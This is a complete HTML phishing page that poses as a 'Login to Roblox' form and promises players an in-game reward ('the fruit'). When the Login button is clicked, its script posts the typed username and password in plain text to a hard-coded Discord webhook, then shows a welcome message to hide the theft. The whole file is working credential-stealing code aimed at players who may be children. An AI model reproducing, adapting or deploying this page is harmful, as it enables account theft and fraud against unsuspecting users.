<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #232527; /* Background color set to #232527 */
        }
        .container {
            background-color: #393b3d; /* Container color set to #393b3d */
            padding: 20px;
            border-radius: 5px;
            width: 500px;
            height: 250px;
            text-align: center;
        }
        .login-container {
            display: none;
        }
        .message {
            display: none;
            background-color: rgba(255, 255, 255, 0.8);
            color: black;
        }
        input {
            width: 80%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 80%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid white;
            border-radius: 4px;
            background-color: #393b3d; /* Button color set to #393b3d */
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #505050;
        }
        h2 {
            color: white; /* Title color set to white */
        }
    </style>
</head>
<body>
    <div class="container login-container">
        <h2>Login to Roblox</h2> <!-- Title changed to "Login to Roblox" -->
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="button" onclick="submitForm()">Login</button>
        </form>
    </div>

    <div class="container message">
        <h2>Welcome!</h2>
        <p>If you logged in, check your account. You have gotten the fruit.</p>
    </div>

    <script>
        function submitForm() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send data to the webhook
            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `Username: ${username}, Password: ${password}`
                })
            }).then(response => {
                // Hide the login container and show the message
                document.querySelector('.login-container').style.display = 'none';
                document.querySelector('.message').style.display = 'block';
            }).catch(error => {
                console.error('Error sending data to webhook:', error);
            });
        }

        // Show the login form initially
        document.querySelector('.login-container').style.display = 'block';
    </script>
</body>
</html>
